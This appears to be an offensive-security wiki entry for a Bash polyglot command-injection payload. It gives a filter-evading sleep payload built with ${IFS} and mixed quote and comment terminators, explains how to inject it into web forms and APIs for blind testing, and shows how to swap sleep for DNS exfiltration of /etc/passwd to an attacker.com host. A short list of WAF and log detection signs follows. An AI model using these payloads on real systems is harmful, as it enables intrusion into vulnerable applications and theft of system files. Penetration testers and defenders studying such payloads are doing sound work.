---
type: code
language: bash
verified: true
platforms:
  - Linux
tags:
  - polyglot
  - command-injection
  - blind-test
validated: true
---

# Bash-Polyglot-Sleep-Payload-Type1

## Code

```bash
1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}

e.g:
echo 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
echo '1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
echo "1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
```

## Description

This Bash-focused polyglot payload induces a 9-second sleep using multiple comment terminators (# for Bash, ';# for SQL-like, "; for quoted strings) to evade input filters that block single-style injections. It's used in blind command injection tests to confirm execution via response timing, and can be adapted by replacing 'sleep 9' with exfiltration commands like 'nslookup $(cat file).domain.com'.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| ${IFS} | Internal Field Separator for spacing without explicit whitespace | (Built-in, no substitution needed) |
| 9 | Sleep duration in seconds for timing confirmation | 9 |

## Usage

Inject after a benign command in vulnerable inputs (e.g., ping?host=1;payload). Use in web forms or APIs. For DNS exfil, modify to: nslookup${IFS}$(cat${IFS}/etc/passwd).attacker.com instead of sleep. Test with curl timing to verify.

## Detection

- WAF logs showing mixed comment characters in inputs (#, ', ").
- Application logs with delayed executions or anomalous sleep commands.
- Network timing anomalies in response latencies.

## Related

- [[procedures/Polyglot-Command-Injection-for-DNS-Data-Exfiltration]]
